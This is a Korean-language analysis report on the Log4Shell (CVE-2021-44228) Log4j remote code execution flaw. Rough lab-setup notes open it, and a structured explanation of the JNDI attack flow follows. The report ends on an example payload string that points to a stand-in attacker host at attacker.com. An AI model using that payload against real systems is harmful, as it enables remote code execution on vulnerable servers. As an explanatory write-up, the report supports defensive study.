이글루코퍼레이션 원치현 Log4shell 분석보고서

# Log4shell
CVE-2021-44228
Log4j 아파치 재단의 무료오픈소스 java기반의 모든 애플가능 다양한 자바 기반 서비스 로그 기록 JDNI데이터및 객체를 발견 참고하기위한 자바 LDAP1389 Lookup JNDI를 통해 찾은 자원을 사용하는 기능

취약서버 구동 도커이미지파일 다운로드
Asudo git clone 
sudo docker build . -t vulnerable-app
새로 생성할 이미지를 vulnerable-app으로 현재 디렉토리에 도커 이미지 build 생성

github.com/welk

미사용 취약한 서버 종료
docker ps -a 실행중인 도커이미지 전체 확인
docker container 아이디 확인

# Log4Shell (CVE-2021-44228) 분석 보고서

## 1. 개요
**Log4Shell(CVE-2021-44228)**은 Apache Log4j 라이브러리에서 발견된 **원격 코드 실행(RCE, Remote Code Execution)** 취약점입니다.  
공격자는 악성 페이로드를 이용하여 **임의의 코드를 실행**할 수 있으며, 광범위한 피해를 초래할 수 있습니다.

본 보고서는 Log4Shell의 원리, 영향, 악용 사례, 탐지 및 대응 방법을 분석합니다.

---

## 2. 취약점 개요

| 항목 | 설명 |
|------|------|
| **취약점명** | Log4Shell |
| **CVE 번호** | CVE-2021-44228 |
| **취약점 유형** | 원격 코드 실행(RCE) |
| **영향을 받는 버전** | Log4j 2.0-beta9 ~ 2.14.1 |
| **패치된 버전** | Log4j 2.15.0 이상 |
| **공격 난이도** | 낮음 (간단한 문자열 입력만으로 악용 가능) |
| **심각도** | 🔥 치명적 (CVSS 10.0) |

---

## 3. 취약점 원리
Log4Shell은 **JNDI(Java Naming and Directory Interface) 룩업 기능의 취약점**을 이용하여 공격자가 원격 서버에서 악성 코드를 실행할 수 있도록 합니다.

### 3.1 공격 흐름
1. 공격자는 악성 문자열을 포함한 로그 메시지를 애플리케이션에 전달.
2. Log4j가 로그를 기록하는 과정에서 **JNDI Lookup을 실행**.
3. JNDI가 LDAP, RMI 등의 원격 서버에서 데이터를 조회.
4. 공격자의 서버에서 악성 Java 클래스 로드 및 실행.
5. **원격 코드 실행(RCE) 발생**.

### 3.2 공격 코드 예제
공격자는 다음과 같은 문자열을 로그에 남기기만 해도 취약점을 악용할 수 있습니다.

```java
${jndi:ldap://attacker.com:1389/exploit}


